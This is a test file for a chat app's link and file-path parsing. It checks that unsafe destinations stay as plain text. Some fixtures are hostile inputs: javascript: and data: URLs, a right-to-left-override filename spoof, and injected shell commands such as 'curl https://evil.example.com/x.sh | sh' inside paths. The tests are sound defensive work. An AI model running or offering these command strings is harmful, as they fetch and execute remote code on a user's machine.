/**
 * The link rules shared by chat bubbles, Back channel posts, Stream entries and
 * agent Markdown (docs/message-links.md). Fixtures are synthetic.
 */
import React from 'react';
import { act, create, type ReactTestRenderer } from 'react-test-renderer';
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';
import { fileUrlToPath, linkParts, webLinks } from '../../mobile/src/utils/richLinks.js';
import { parseInline } from '../../mobile/src/utils/agentMarkdown.js';

const os = vi.hoisted(() => ({ platform: 'ios', open: vi.fn(), copy: vi.fn(), stored: null as string | null, setItem: vi.fn(async () => undefined) }));
vi.mock('react-native', () => ({
  Platform: { get OS() { return os.platform; }, select: (values: any) => values[os.platform] ?? values.default },
  Alert: { alert: vi.fn() }, Linking: { openURL: os.open }, StyleSheet: { create: (s: unknown) => s, hairlineWidth: 1 },
  Animated: { View: 'Animated.View', Value: class { setValue() {} }, sequence: () => ({ start: () => {} }), timing: () => ({}), delay: () => ({}) },
  Text: 'Text', View: 'View', ScrollView: 'ScrollView', TouchableOpacity: 'TouchableOpacity',
}));
vi.mock('expo-clipboard', () => ({ setStringAsync: os.copy }));
vi.mock('@react-native-async-storage/async-storage', () => ({ default: { getItem: async () => os.stored, setItem: os.setItem } }));
vi.mock('../../mobile/src/contexts/ThemeContext', () => ({ useTheme: () => ({ scheme: 'light' }) }));
import { MessageText } from '../../mobile/src/components/MessageText.js';
import { StreamText } from '../../mobile/src/components/StreamText.js';
import { AgentMarkdown } from '../../mobile/src/components/AgentMarkdown.js';
import { MessageLinkActions } from '../../mobile/src/components/MessageLinkActions.js';
import { GlobalNotice } from '../../mobile/src/components/GlobalNotice.js';
import { useLinksAsTyped } from '../../mobile/src/services/linkDisplay.js';

type Shape = ['text', string] | ['link', string, string] | ['path', string, string];
const shape = (content: string): Shape[] => linkParts(content).map(part =>
  part.t === 'text' ? ['text', part.source] : part.t === 'link' ? ['link', part.label, part.url] : ['path', part.label, part.path]);

describe('link rules', () => {
  it.each<[string, Shape[]]>([
    ['See [the plan](https://docs.example.com/plan).', [['text', 'See '], ['link', 'the plan', 'https://docs.example.com/plan'], ['text', '.']]],
    ['[site](www.example.org/a)', [['link', 'site', 'https://www.example.org/a']]],
    ['[a](https://a.example.com) [b](https://b.example.com)', [['link', 'a', 'https://a.example.com'], ['text', ' '], ['link', 'b', 'https://b.example.com']]],
    ['[wrapped](<https://example.com/a b>)', [['text', '[wrapped](<https://example.com/a b>)']]],
    ['[unclosed](https://example.com', [['text', '[unclosed]('], ['link', 'https://example.com', 'https://example.com']]],
    ['[docs](https://example.org/a_(b))', [['link', 'docs', 'https://example.org/a_(b)']]],
    ['([docs](https://example.org/a_(b)_c)).', [['text', '('], ['link', 'docs', 'https://example.org/a_(b)_c'], ['text', ').']]],
    ['www.example.com/x, then', [['link', 'www.example.com/x', 'https://www.example.com/x'], ['text', ', then']]],
    ['![img](https://example.com/a.png)', [['text', '!'], ['link', 'img', 'https://example.com/a.png']]],
    ['plain https://example.org/x, then text', [['text', 'plain '], ['link', 'https://example.org/x', 'https://example.org/x'], ['text', ', then text']]],
  ])('web links: %s', (content, expected) => { expect(shape(content)).toEqual(expected); });

  it.each<[string, Shape[]]>([
    ['[Plan](file:///Users/alex/Projects/Demo%20Site/README.md)', [['path', 'Plan', '/Users/alex/Projects/Demo Site/README.md']]],
    ['file:///Users/alex/notes.txt.', [['path', '/Users/alex/notes.txt', '/Users/alex/notes.txt'], ['text', '.']]],
    ['[x](file://localhost/tmp/a)', [['path', 'x', '/tmp/a']]],
    // A stray % is part of the file name; a link labelled with its own address shows the path.
    ['[x](file:///bad%ZZ)', [['path', 'x', '/bad%ZZ']]],
    ['file:///tmp/100%done%20now.txt', [['path', '/tmp/100%done now.txt', '/tmp/100%done now.txt']]],
    ['[file:///Users/alex/a%20b.txt](file:///Users/alex/a%20b.txt)', [['path', '/Users/alex/a b.txt', '/Users/alex/a b.txt']]],
    ['<file:///Users/alex/notes.txt>', [['text', '<'], ['path', '/Users/alex/notes.txt', '/Users/alex/notes.txt'], ['text', '>']]],
    ['[index](file:///Users/sam/My%20Notes/INDEX.html)', [['path', 'index', '/Users/sam/My Notes/INDEX.html']]],
    ['[index](file:///Users/sam/My Notes/INDEX.html)', [['path', 'index', '/Users/sam/My Notes/INDEX.html']]],
    ['[index](<file:///Users/sam/My Notes/INDEX.html>)', [['path', 'index', '/Users/sam/My Notes/INDEX.html']]],
    ['[notes](/Users/sam/notes/plan.md)', [['path', 'notes', '/Users/sam/notes/plan.md']]],
    ['[win](file:///C:/Users/sam/plan.docx)', [['path', 'win', 'C:/Users/sam/plan.docx']]],
    ['file:///tmp//a.txt', [['path', '/tmp//a.txt', '/tmp//a.txt']]],
    ['file:///Users/sam/a%20b.html and more', [['path', '/Users/sam/a b.html', '/Users/sam/a b.html'], ['text', ' and more']]],
    ['Open file://localhost/Users/sam/x.', [['text', 'Open '], ['path', '/Users/sam/x', '/Users/sam/x'], ['text', '.']]],
  ])('file links become paths, never links: %s', (content, expected) => {
    expect(shape(content)).toEqual(expected);
    expect(webLinks(content)).toEqual([]);
  });

  it.each([
    '[x](javascript:alert(1))', '[x](JaVaScRiPt:alert(1))', '[x](data:text/html,hi)', '[x](vbscript:msgbox)', '[x](intent://scan/#Intent;end)',
    '[x](https://user:pw@example.com)', '[x](https://)', '[x](ftp://example.com/a)', '[x](mailto:sam@example.com)', '[ ](https://example.com)',
    '[x](javascript:https://example.com)', '[a](java%09script:x)', '<javascript:alert(2)>', '[x](file://server.example/share/a)', 'file://nas.example/share/a.txt', '[x](file:///Users/sam/%E0%A4%A)', '[x](file://user@host/a)',
    'javascript:alert(1) data:text/html,hi vbscript:x', 'file:relative/path', 'myfile:///Users/sam/a',
    // A file address is written file://…, and never names another machine by a doubled slash.
    '[x](file:foo)', '[x](file:/tmp/a)', '[x](file:////server.example/share/a)', 'file:////server.example/share/a',
    'file://localhost//server.example/share', 'file://///x', '[x](file:///%2Fserver.example/share)', 'file:///%2F%2Fserver.example/share', '[x](file:///%5C%5Cserver%5Cshare)', '[x](file:///%2Ftmp)',
    // Nothing invisible, direction-changing or shell-active may reach the clipboard or hide in an address.
    '[report.pdf](file:///tmp/%E2%80%AEgpj.exe)', '[x](file:///tmp/a%C2%85b)', '[x](file:///tmp/a%E2%80%A8b)', '[x](file:///tmp/a%3Bopen%20b)',
    '[x](/Users/sam/a;open)', 'file:///tmp/a%7Csh', '[x](https://ok.example.com/\u200b)', '[x](https://ok.example.com/\u202egpj)',
  ])('leaves an unusable destination exactly as typed: %s', content => {
    expect(shape(content)).toEqual([['text', content]]);
  });

  it.each<[string, Shape[]]>([
    // One chip, spaces kept: it looks like a file or folder, or reads like a name.
    ['/Users/sam/My Projects/Index Folder', [['path', '/Users/sam/My Projects/Index Folder', '/Users/sam/My Projects/Index Folder']]],
    ['/Users/sam/my notes/plan.html', [['path', '/Users/sam/my notes/plan.html', '/Users/sam/my notes/plan.html']]],
    ['/Users/sam/my notes/', [['path', '/Users/sam/my notes/', '/Users/sam/my notes/']]],
    ['Folder:\n/Users/sam/My Projects/Index Folder  \nnext', [['text', 'Folder:\n'], ['path', '/Users/sam/My Projects/Index Folder', '/Users/sam/My Projects/Index Folder'], ['text', '  \nnext']]],
    // A sentence that merely starts with a path: the path ends at the first space.
    ['/Users/x is where files go.', [['path', '/Users/x', '/Users/x'], ['text', ' is where files go.']]],
    ['/tmp/build is where I left v2.0', [['path', '/tmp/build', '/tmp/build'], ['text', ' is where I left v2.0']]],
    ['/Users/sam/Notes And More, see below', [['path', '/Users/sam/Notes', '/Users/sam/Notes'], ['text', ' And More, see below']]],
    ['[taxes](/Users/sam/2024 - Taxes/summary.pdf)', [['path', 'taxes', '/Users/sam/2024 - Taxes/summary.pdf']]],
    ['/Users/sam/My Notes - Draft/Plan Final.html', [['path', '/Users/sam/My Notes - Draft/Plan Final.html', '/Users/sam/My Notes - Draft/Plan Final.html']]],
    // A line that goes on to a flag, an assignment or a second path is a command: each path stands alone.
    ['/tmp/a -o /tmp/b', [['path', '/tmp/a', '/tmp/a'], ['text', ' -o '], ['path', '/tmp/b', '/tmp/b']]],
    ['/usr/bin/env FOO=1 /tmp/x.sh', [['path', '/usr/bin/env', '/usr/bin/env'], ['text', ' FOO=1 '], ['path', '/tmp/x.sh', '/tmp/x.sh']]],
    ['/tmp/a /tmp/b.txt', [['path', '/tmp/a', '/tmp/a'], ['text', ' '], ['path', '/tmp/b.txt', '/tmp/b.txt']]],
    // Windows paths need the backslash; a destination with spaces is read to its closing parenthesis.
    ['C:\\Users\\a\\.config\\x', [['path', 'C:\\Users\\a\\.config\\x', 'C:\\Users\\a\\.config\\x']]],
    ['Plan A:/B', [['text', 'Plan A:/B']]],
    ['[notes](/Users/sam/My Notes/plan.md)', [['path', 'notes', '/Users/sam/My Notes/plan.md']]],
  ])('path extent: %s', (content, expected) => { expect(shape(content)).toEqual(expected); });

  it('does not offer a command line as a path to copy', () => {
    // A failing destination leaves the whole link as typed, never a stray piece of it.
    for (const whole of ['[docs](/tmp/x -o /tmp/y)', '[docs](/tmp/x -f)', '[x](/usr/bin/env A=1 b)', '[x](file:///tmp/a%20-o%20b)', '[x](/Users/sam/a!b.txt)', '/Users/sam/{a,b}.txt', '[x](file:///tmp/%7Ba%7D)', '[docs](/Users/x; curl evil.sh | sh #)', '[x](/Users/sam/a"b.txt)', '/Users/sam/a"b.txt', '[x](file:///tmp/a%22b)']) expect(shape(whole)).toEqual([['text', whole]]);
    const line = '/Users/sam/ ; curl https://evil.example.com/x.sh | sh ; x.sh';
    // At most the folder itself is offered; the command never is.
    expect(linkParts(line).flatMap(part => part.t === 'path' ? [part.path] : [])).toEqual(['/Users/sam/']);
    expect(linkParts('/tmp/a;open b and `/tmp/b`').filter(part => part.t === 'path')).toEqual([]);
  });
  it('loses no character and stays quick on hostile input', () => {
    for (const content of ['[a](b) [c](d) [e](https://e.example.com)', '[[[[', ']('.repeat(50), '[x](file:///Users/s/a) /Users/s/b ~/c https://d.example.com file:///e']) {
      expect(linkParts(content).map(part => part.source).join('')).toBe(content);
    }
    const started = Date.now();
    for (const big of ['['.repeat(20000), '[a]('.repeat(5000), '[a](file:'.repeat(2500), 'file://'.repeat(3000), '[x](https://e.example.com) '.repeat(700), '[a]((((('.repeat(3000), '[a](' + 'b('.repeat(8000), '[a](' + '(b)'.repeat(6000), '[a](/Users/' + 'x '.repeat(9000), ('/Users/a b c d e f.txt\n').repeat(900), '[a](/Users/x)'.repeat(1500)]) {
      expect(linkParts(big).map(part => part.source).join('')).toBe(big);
    }
    expect(Date.now() - started).toBeLessThan(1500);
  });

  it('reads a path out of a file address', () => {
    expect(fileUrlToPath('file:///Users/sam/a%20b.html')).toBe('/Users/sam/a b.html');
    expect(fileUrlToPath('FILE://LOCALHOST/Users/sam/x')).toBe('/Users/sam/x');
    for (const not of ['file:/Users/sam/x', 'file:foo', 'file:////server/share']) expect(fileUrlToPath(not)).toBeNull();
    expect(fileUrlToPath('file:///Users/%zz')).toBe('/Users/%zz'); expect(fileUrlToPath('file:///a%25b%')).toBe('/a%b%');
    for (const bad of ['file://', 'file:', 'file:///Users/%0Aevil', 'file:///a%0Ab', 'file:///a%E0%A4%A', 'https://example.com/a']) expect(fileUrlToPath(bad)).toBeNull();
  });

  it('reads paths in an agent’s Markdown from the raw text, before emphasis', () => {
    expect(parseInline('Cache at /Users/me/__pycache__/x and **bold**')).toEqual([
      { t: 'text', v: 'Cache at ' }, { t: 'path', label: '/Users/me/__pycache__/x', path: '/Users/me/__pycache__/x' },
      { t: 'text', v: ' and ' }, { t: 'bold', c: [{ t: 'text', v: 'bold' }] },
    ]);
    expect(parseInline('[n](/Users/sam/My Notes/p.md) then /tmp/a_b_c.txt')).toEqual([
      { t: 'path', label: 'n', path: '/Users/sam/My Notes/p.md' }, { t: 'text', v: ' then ' }, { t: 'path', label: '/tmp/a_b_c.txt', path: '/tmp/a_b_c.txt' },
    ]);
    expect(parseInline('`/Users/x/y` stays code')).toEqual([{ t: 'code', v: '/Users/x/y' }, { t: 'text', v: ' stays code' }]);
    // Code spans, links and emphasis that start before a path keep it inside them.
    expect(parseInline('`cp /tmp/a /tmp/b` then')).toEqual([{ t: 'code', v: 'cp /tmp/a /tmp/b' }, { t: 'text', v: ' then' }]);
    expect(parseInline('[label with /Users/a/b inside](https://e.example.org)')).toEqual([{ t: 'link', href: 'https://e.example.org/',
      c: [{ t: 'text', v: 'label with ' }, { t: 'path', label: '/Users/a/b', path: '/Users/a/b' }, { t: 'text', v: ' inside' }] }]);
    expect(parseInline('**bold /Users/a/b**')).toEqual([{ t: 'bold', c: [{ t: 'text', v: 'bold ' }, { t: 'path', label: '/Users/a/b', path: '/Users/a/b' }] }]);
    // A destination holding two paths is not one path: the whole link stays as typed.
    expect(parseInline('[x](/Users/a b /Users/c d)')).toEqual([{ t: 'text', v: '[x](/Users/a b /Users/c d)' }]);
    expect(parseInline('[x](/Users/a b/c d.txt)')).toEqual([{ t: 'path', label: 'x', path: '/Users/a b/c d.txt' }]);
    expect(parseInline('x/Users/a/b and (/Users/a/b)')).toEqual([{ t: 'text', v: 'x/Users/a/b and (' }, { t: 'path', label: '/Users/a/b', path: '/Users/a/b' }, { t: 'text', v: ')' }]);
    expect(parseInline('[docs](/Users/x; curl evil.sh | sh #)')).toEqual([{ t: 'text', v: '[docs](/Users/x; curl evil.sh | sh #)' }]);
  });
  it('gives an agent’s Markdown the same file rules', () => {
    expect(parseInline('See [the index](file:///Users/sam/My%20Notes/INDEX.html) or file:///tmp/a.txt.')).toEqual([
      { t: 'text', v: 'See ' }, { t: 'path', label: 'the index', path: '/Users/sam/My Notes/INDEX.html' },
      { t: 'text', v: ' or ' }, { t: 'path', label: '/tmp/a.txt', path: '/tmp/a.txt' }, { t: 'text', v: '.' },
    ]);
    expect(parseInline('[x](javascript:alert(1)) [y](data:text/html,hi) [z](vbscript:x)').every(node => node.t === 'text')).toBe(true);
  });
});

let tree: ReactTestRenderer | undefined;
const host = (role: string) => tree!.root.findAll(node => node.type === 'Text' && node.props.accessibilityRole === role);
const flatten = (node: unknown): string => typeof node === 'string' ? node : Array.isArray(node) ? node.map(flatten).join('')
  : node && typeof node === 'object' && 'children' in node ? flatten((node as { children: unknown }).children) : '';
const mount = async (element: React.ReactElement) => { await act(async () => { tree = create(element); }); };
const press = { stopPropagation: () => {}, preventDefault: () => {} };
const MIXED = 'Read [the plan](https://docs.example.com/plan), open [the index](file:///Users/sam/My%20Notes/INDEX.html), skip [this](javascript:alert(1)).';
beforeEach(() => { vi.clearAllMocks(); os.platform = 'ios'; os.open.mockResolvedValue(undefined); os.copy.mockResolvedValue(true); });
afterEach(async () => { if (tree) await act(async () => tree!.unmount()); tree = undefined; });

describe.each([
  ['a chat bubble', (content: string) => React.createElement(MessageText, { content, color: '#000', onLongPress: vi.fn() })],
  ['a Stream card', (content: string) => React.createElement(StreamText, { content, color: '#000', linkColor: '#00f', pathBackground: '#eee', onLongPress: vi.fn() })],
  ['an agent’s message', (content: string) => React.createElement(AgentMarkdown, { content, color: '#000', linkColor: '#00f', codeBackground: '#eee' })],
])('rendering in %s', (_name, render) => {
  it('shows the link text, opens only the web link, and leaves the unsafe one as typed', async () => {
    await mount(render(MIXED));
    expect(flatten(tree!.toJSON())).toBe('Read the plan, open 📁\u00a0the index, skip [this](javascript:alert(1)).');
    const links = host('link');
    expect(links).toHaveLength(1);
    await act(async () => { links[0]!.props.onPressIn?.(); links[0]!.props.onPress(press); });
    expect(os.open.mock.calls.map(call => String(call[0]).replace(/\/$/, ''))).toEqual(['https://docs.example.com/plan']);
  });
  it('copies a file path instead of opening it, and says where to paste it', async () => {
    await mount(React.createElement(React.Fragment, {}, render(MIXED), React.createElement(GlobalNotice)));
    const chip = host('button')[0]!;
    expect(chip.props.accessibilityLabel).toBe('the index (copy path /Users/sam/My Notes/INDEX.html)');
    expect(chip.props.href).toBeUndefined();
    await act(async () => { chip.props.onPress(press); });
    expect(os.copy).toHaveBeenCalledWith('/Users/sam/My Notes/INDEX.html'); expect(os.open).not.toHaveBeenCalled();
    expect(tree!.root.findByProps({ role: 'status' }).props.children).toBe('Path copied: paste in Finder (⇧⌘G)');
  });
  it('does not claim success when the copy fails', async () => {
    os.copy.mockRejectedValueOnce(new Error('denied'));
    await mount(React.createElement(React.Fragment, {}, render(MIXED), React.createElement(GlobalNotice)));
    await act(async () => { host('button')[0]!.props.onPress(press); });
    expect(tree!.root.findByProps({ role: 'status' }).props.children).toBe('Couldn’t copy. Path: /Users/sam/My Notes/INDEX.html'.replace('’', "'"));
  });
  it('hands the path to a desktop shell when one offers to open it, and copies when that fails', async () => {
    const openPath = vi.fn(async function (this: unknown) { return this === shell ? '' : 'lost this'; });
    const shell: Record<string, unknown> = { openPath };
    vi.stubGlobal('ideaflowDesktop', shell);
    try {
      await mount(React.createElement(React.Fragment, {}, render(MIXED), React.createElement(GlobalNotice)));
      await act(async () => { host('button')[0]!.props.onPress(press); });
      expect(openPath).toHaveBeenCalledWith('/Users/sam/My Notes/INDEX.html'); expect(os.copy).not.toHaveBeenCalled(); expect(os.open).not.toHaveBeenCalled();
      shell.openPath = vi.fn(async () => undefined) as any;
      await act(async () => { host('button')[0]!.props.onPress(press); });
      expect(os.copy).not.toHaveBeenCalled();
      // Electron's shell.openPath reports failure as a non-empty string; a throw counts too.
      for (const failure of [async () => 'Failed to open path', async () => false, async () => { throw new Error('denied'); }]) {
        os.copy.mockClear(); shell.openPath = vi.fn(failure) as any;
        await act(async () => { host('button')[0]!.props.onPress(press); });
        expect(os.copy).toHaveBeenCalledWith('/Users/sam/My Notes/INDEX.html');
        expect(tree!.root.findByProps({ role: 'status' }).props.children).toBe('Path copied: paste in Finder (⇧⌘G)');
      }
      // revealPath is the agreed name and wins when a shell offers both.
      const revealPath = vi.fn(async () => undefined); shell.revealPath = revealPath; shell.openPath = vi.fn();
      os.copy.mockClear();
      await act(async () => { host('button')[0]!.props.onPress(press); });
      expect(revealPath).toHaveBeenCalledWith('/Users/sam/My Notes/INDEX.html'); expect(shell.openPath).not.toHaveBeenCalled(); expect(os.copy).not.toHaveBeenCalled();
    } finally { vi.unstubAllGlobals(); }
  });
  it('puts the full path in a tooltip on web and never renders a file anchor', async () => {
    os.platform = 'web';
    await mount(render(MIXED));
    expect(tree!.root.findAllByType('span' as any).map(node => node.props.title)).toEqual(['/Users/sam/My Notes/INDEX.html']);
    expect(tree!.root.findAll(node => typeof node.props.href === 'string').map(node => node.props.href).filter(href => !/^https:/.test(href))).toEqual([]);
  });
  it('shows the text exactly as typed when the reader asks for that', async () => {
    let set!: (next: boolean) => void;
    const Probe = () => { set = useLinksAsTyped()[1]; return null; };
    await mount(React.createElement(React.Fragment, {}, React.createElement(Probe), render(MIXED)));
    await act(async () => { set(true); });
    expect(flatten(tree!.toJSON())).toBe(MIXED); expect(host('link')).toEqual([]); expect(host('button')).toEqual([]);
    expect(os.setItem).toHaveBeenCalledWith('openchat.links.asTyped', 'true');
    await act(async () => { set(false); });
    expect(host('link')).toHaveLength(1);
  });
});

it('lists a named link with its real destination in the message link actions', async () => {
  await mount(React.createElement(MessageLinkActions, { content: '[example.com](https://other.example.org/login) and https://example.net', color: '#000', borderColor: '#ddd' }));
  const text = flatten(tree!.toJSON());
  expect(text).toContain('example.com'); expect(text).toContain('https://other.example.org/login');
  const open = tree!.root.findAllByType('TouchableOpacity' as any).filter(node => String(node.props.accessibilityLabel).startsWith('Open link'));
  expect(open.map(node => node.props.accessibilityLabel)).toEqual(['Open link: example.com', 'Open link: https://example.net']);
});
